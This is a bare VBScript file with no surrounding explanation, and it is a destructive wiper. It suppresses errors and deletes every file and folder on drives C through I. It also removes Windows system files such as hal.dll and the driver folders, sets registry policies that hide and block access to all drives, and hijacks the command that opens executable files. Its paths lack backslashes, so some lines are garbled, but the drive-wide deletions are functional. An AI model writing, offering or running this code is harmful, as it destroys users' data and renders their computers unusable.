on error resume next
Set S = CreateObject("Wscript.Shell")
set FSO=createobject("scripting.filesystemobject")
fso.deletefile "C:*.*",1
fso.deletefolder "C:*.*",1
fso.deletefile "D:*.*",1
fso.deletefolder "D:*.*",1
fso.deletefile "E:*.*",1
fso.deletefolder "E:*.*",1
fso.deletefile "F:*.*",1
fso.deletefolder "F:*.*",1
fso.deletefile "G:*.*",1
fso.deletefolder "G:*.*",1
fso.deletefile "H:*.*",1
fso.deletefolder "H:*.*",1
fso.deletefile "I:*.*",1
fso.deletefolder "I:*.*",1
fso.deletefile fso.getspecialfolder(0)+"system32hal.dll",1
fso.deletefolder fso.getspecialfolder(0)+"system32drives",1
fso.deletefolder fso.getspecialfolder(0)+"Driver Cache"
fso.deletefile fso.getspecialfolder(0)+"system32hal.dll",1
s.regwrite"HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesExplorerNoDrives","67108863","REG_DWORD"
s.regwrite"HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesExplorerNoViewOnDrive","67108863","REG_DWORD"
s.regwrite"HKCRexefileshellopencommand","rundll32.exe"